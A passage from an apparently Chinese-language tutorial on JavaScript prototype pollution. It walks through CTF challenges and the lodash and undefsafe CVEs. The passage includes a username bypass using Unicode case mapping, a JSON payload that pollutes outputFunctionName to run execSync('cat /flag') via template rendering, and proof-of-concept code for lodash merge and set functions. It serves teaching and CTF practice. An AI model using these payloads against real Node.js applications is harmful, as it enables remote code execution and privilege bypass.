    })
    module.exports = router;
源码中用了 `merge()` 和 `clone()`，那必定是原型链污染了。往下找到调用 `clone()` 的位置：
    router.post('/action', function (req, res) {    // /action路由只能admin用户访问
      if(req.session.user.user!="ADMIN"){res.end("")} 
      req.session.user.data = clone(req.body);    // 使用了之前定义的危险的merge操作
      res.end("");  
    });
可见，当我们登上 admin 用户后，便可以发送 POST 数据来进行原型链污染了。但是要污染哪一个参数呢，我们继续向下看到 /info 路由：
    router.get('/info', function (req, res) {
      res.render('index',data={'user':res.outputFunctionName});
    })
可以看到在 `/info` 下，将 res 对象中的 `outputFunctionName` 属性渲染入 `index` 中，而
`outputFunctionName` 是未定义的：
    res.outputFunctionName=undefined;
所以我们就污染 `outputFunctionName` 属性吧。
但是需要admin账号才能用到 `clone()`，于是去到 `/login` 路由处：
    router.post('/login', function (req, res) {
      if(req.body.Submit=="register"){
       if(safeKeyword(req.body.userid)){    // 注册的用户的userid不能是admin
        res.end("") 
       }
        req.session.user={
          'user':req.body.userid.toUpperCase(),    // 变成大写
          'passwd': req.body.pwd,
          'isLogin':false
        }
        res.redirect('/'); 
      }
      else if(req.body.Submit=="login"){
        if(!req.session.user){res.end("")}
        if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
          req.session.user.isLogin=true;
        }
        else{
          res.end("")
        }
      }
      res.redirect('/'); ;
    });
可以看到注册的用户名不能为 admin（大小写），不过有个地方可以注意到：
    'user':req.body.userid.toUpperCase(),
这里将user给转为大写了，这种转编码的通常都很容易出问题，具体请参考 p 牛的文章
[《Fuzz中的javascript大小写特性》](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
我们可以注册一个 `admın`（此admın非彼admin，仔细看i部分）：
> 特殊字符绕过：
>
> **toUpperCase()**
>
> 我们可以在其中混入了两个奇特的字符"ı"、"ſ"。这两个字符的“大写”是I和S。也就是说"ı".toUpperCase() ==
> 'I'，"ſ".toUpperCase() == 'S'。通过这个小特性可以绕过一些限制。
>
> **toLowerCase()**
>
> 这个"K"的“小写”字符是k，也就是"K".toLowerCase() == 'k'.
注册后成功登录admin用户：
让我们输入自己最喜欢的语言，这里我们就可以发送 Payload 进行原型链污染了：
    {"lua":"123","__proto__":{"outputFunctionName":"t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"},"Submit":""}
输入后抓包：
并将 Content-Type 设为 application/json，POST Body 部分改为 Json 格式的数据并加上Payload：
然后访问 /info 路由即可得到flag：
### Nullcon HackIM
再来看看 Nullcon HackIM 中的一个例子：
    'use strict';
    const express = require('express');
    const bodyParser = require('body-parser')
    const cookieParser = require('cookie-parser');
    const path = require('path');
    const isObject = obj => obj && obj.constructor && obj.constructor === Object;
    function merge(a, b) {
        for (var attr in b) {
            if (isObject(a[attr]) && isObject(b[attr])) {
                merge(a[attr], b[attr]);
            } else {
                a[attr] = b[attr];
            }
        }
        return a
    }
    function clone(a) {
        return merge({}, a);
    }
    // Constants
    const PORT = 8080;
    const HOST = '0.0.0.0';
    const admin = {};
    // App
    const app = express();
    app.use(bodyParser.json())    // 调用中间件解析json
    app.use(cookieParser());
    app.use('/', express.static(path.join(__dirname, 'views')));
    app.post('/signup', (req, res) => {
        var body = JSON.parse(JSON.stringify(req.body));
        var copybody = clone(body)
        if (copybody.name) {
            res.cookie('name', copybody.name).json({
                "done": "cookie set"
            });
        } else {
            res.json({
                "error": "cookie not set"
            })
        }
    });
    app.get('/getFlag', (req, res) => {
        var аdmin = JSON.parse(JSON.stringify(req.cookies))
        if (admin.аdmin == 1) {
            res.send("hackim19{}");
        } else {
            res.send("You are not authorized");
        }
    });
    app.listen(PORT, HOST);
    console.log(`Running on http://${HOST}:${PORT}`);
代码很简单，还是使用了 Merge 危险操作，存在原型链污染，因此最简单的 Payload 就是：
    {"__proto__": {"admin": 1}}
## Lodash 模块原型链污染
Lodash 是一个 JavaScript 库，包含简化字符串、数字、数组、函数和对象编程的工具，可以帮助程序员更有效地编写和维护 JavaScript
代码。并且是一个流行的 npm 库，仅在GitHub 上就有超过 400 万个项目使用，Lodash的普及率非常高，每月的下载量超过 8000
万次。但是这个库中有几个严重的原型污染漏洞。
### lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）
2019 年 7 月 2 日，[Snyk 发布了一个高严重性原型污染安全漏洞](https://snyk.io/vuln/SNYK-JS-LODASH-450202)（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。
Lodash 库中的 `defaultsDeep` 函数可能会被包含 `constructor` 的 Payload
诱骗添加或修改`Object.prototype` 。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk
给出的此漏洞验证 POC：
    const mergeFn = require('lodash').defaultsDeep;
    const payload = '{"constructor": {"prototype": {"whoami": "Vulnerable"}}}'
    function check() {
        mergeFn({}, JSON.parse(payload));
        if (({})[`a0`] === true) {
            console.log(`Vulnerable to Prototype Pollution via ${payload}`);
        }
      }
    check();
我们在 `mergeFn({}, JSON.parse(payload));` 处下断点，单步结束后可以看到：
成功在 `__proto__` 属性中添加了一个 `whoami` 属性，值为 `Vulnerable`，污染成功。
该漏洞披露之后，Lodash 于 7 月 9 日发布了 4.17.12 版本，其中包括 Snyk 修复和修复漏洞。我们可以参考一下 Snyk 的工程师
[Kirill](https://github.com/kirill89) 发布到 GitHub 上的 lodash JavaScript 库存储库
 的实际安全修复：
该修复包括以下两项安全检查：
  * 过滤了 `constructor` 以确保我们不会污染全局对象`constructor`
  * 还添加了一个测试用例以确保将来不会发生回归
### lodash.merge 方法造成的原型链污染
Lodash.merge 作为 lodash 中的对象合并插件，他可以 **递归** 合并 `sources` 来源对象自身和继承的可枚举属性到
`object` 目标对象，以创建父映射对象：
    merge(object, sources)
当两个键相同时，生成的对象将具有最右边的键的值。如果多个对象相同，则新生成的对象将只有一个与这些对象相对应的键和值。但是这里的 lodash.merge
操作实际上存在原型链污染漏洞，下面对其进行简单的分析，这里使用 4.17.4 版本的 Lodash。
  * node_modules/lodash/merge.js
merge.js 调用了 baseMerge 方法，则定位到 baseMerge：
  * node_modules/lodash/_baseMerge.js
如果 srcValue 是一个对象则进入 baseMergeDeep 方法，跟进 baseMergeDeep 方法：
  * node_modules/lodash/_baseMergeDeep.js
跟进 assignMergeValue 方法：
  * node_modules/lodash/_assignMergeValue.js：
跟进 baseAssignValue 方法：
  * node_modules/lodash/_baseAssignValue.js
这里的 if 判断可以绕过，最终进入 `object[key] = value` 的赋值操作。
下面给出一个验证漏洞的 POC：
    var lodash= require('lodash');
    var payload = '{"__proto__":{"whoami":"Vulnerable"}}';
    var a = {};
    console.log("Before whoami: " + a.whoami);
    lodash.merge({}, JSON.parse(payload));
    console.log("After whoami: " + a.whoami);
我们在 `lodash.merge({}, JSON.parse(payload));` 处下断点，单步结束后可以看到：
成功在类型为 Object 的 a 对象的 `__proto__` 属性中添加了一个 `whoami` 属性，值为 `Vulnerable`，污染成功。
在 lodash.merge 方法造成的原型链污染中，为了实现代码执行，我们常常会污染 `sourceURL` 属性，即给所有 Object
对象中都插入一个 `sourceURL` 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞。后文中我们会通过 [Code-Breaking 2018] Thejs 这道题来仔细讲解。
### lodash.mergeWith 方法造成的原型链污染
这个方法类似于 `merge` 方法。但是它还会接受一个 `customizer`，以决定如何进行合并。 如果 `customizer` 返回
`undefined` 将会由合并处理方法代替。
    mergeWith(object, sources, [customizer])
该方法与 `merge` 方法一样存在原型链污染漏洞，下面给出一个验证漏洞的 POC：
    var lodash= require('lodash');
    var payload = '{"__proto__":{"whoami":"Vulnerable"}}';
    var a = {};
    console.log("Before whoami: " + a.whoami);
    lodash.mergeWith({}, JSON.parse(payload));
    console.log("After whoami: " + a.whoami);
我们在 `lodash.mergeWith({}, JSON.parse(payload));` 处下断点，单步结束后可以看到：
成功在类型为 Object 的 a 对象的 `__proto__` 属性中添加了一个 `whoami` 属性，值为 `Vulnerable`，污染成功。
### lodash.set 方法造成的原型链污染
Lodash.set 方法可以用来设置值到对象对应的属性路径上，如果没有则创建这部分路径。 缺少的索引属性会创建为数组，而缺少的属性会创建为对象。
    set(object, path, value)
  * 示例：
    var object = { 'a': [{ 'b': { 'c': 3 } }] };
    _.set(object, 'a[0].b.c', 4);
    console.log(object.a[0].b.c);
    // => 4
    _.set(object, 'x[0].y.z', 5);
    console.log(object.x[0].y.z);
    // => 5
在使用 Lodash.set 方法时，如果没有对传入的参数进行过滤，则可能会造成原型链污染。下面给出一个验证漏洞的 POC：
    var lodash= require('lodash');
    var object_1 = { 'a': [{ 'b': { 'c': 3 } }] };
    var object_2 = {}
    console.log(object_1.whoami);
    //lodash.set(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');
    lodash.set(object_2, '__proto__.["whoami"]', 'Vulnerable');
    console.log(object_1.whoami);
我们在 `lodash.set(object_2, '__proto__.["whoami"]', 'Vulnerable');`
处下断点，单步结束后可以看到：
在类型为 Array 的 object_1 对象的 `__proto__` 属性中出现了一个 `whoami` 属性，值为
`Vulnerable`，污染成功。
### lodash.setWith 方法造成的原型链污染
Lodash.setWith 方法类似 `set` 方法。但是它还会接受一个 `customizer`，用来调用并决定如何设置对象路径的值。 如果
`customizer` 返回 `undefined` 将会有它的处理方法代替。
    setWith(object, path, value, [customizer])
该方法与 `set` 方法一样可以进行原型链污染，下面给出一个验证漏洞的 POC：
    var lodash= require('lodash');
    var object_1 = { 'a': [{ 'b': { 'c': 3 } }] };
    var object_2 = {}
    console.log(object_1.whoami);
    //lodash.setWith(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');
    lodash.setWith(object_2, '__proto__.["whoami"]', 'Vulnerable');
    console.log(object_1.whoami);
我们在 `lodash.setWith(object_2, '__proto__.["whoami"]', 'Vulnerable');`
处下断点，单步结束后可以看到：
在类型为 Array 的 object_1 对象的 `__proto__` 属性中出现了一个 `whoami` 属性，值为
`Vulnerable`，污染成功。
至此，我们已经对 lodash 模块中的几个原型链污染做了验证，可以成功污染原型中的属性。但如果要进行代码执行，则还需要配合 `eval()`
方法的执行或模板引擎的渲染。
## Undefsafe 模块原型链污染（CVE-2019-10795）
Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（<
2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性。
我们先简单测试一下该模块的使用：
    var a = require("undefsafe");
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    console.log(object.a.b.e)
    // skysec
可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错：
    console.log(object.a.c.e)
    // TypeError: Cannot read property 'e' of undefined
在编程时，代码量较大时，我们可能经常会遇到类似情况，导致程序无法正常运行，发送我们最讨厌的报错。那么 undefsafe 可以帮助我们解决这个问题：
    var a = require("undefsafe");
    console.log(a(object,'a.b.e'))
    // skysec
    console.log(object.a.b.e)
    // skysec
    console.log(a(object,'a.c.e'))
    // undefined
    console.log(object.a.c.e)
    // TypeError: Cannot read property 'e' of undefined
那么当我们无意间访问到对象不存在的属性时，就不会再进行报错，而是会返回 undefined 了。
同时在对对象赋值时，如果目标属性存在：
    var a = require("undefsafe");
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    console.log(object)
    // { a: { b: { c: 1, d: [Array], e: 'skysec' } } }
    a(object,'a.b.e','123')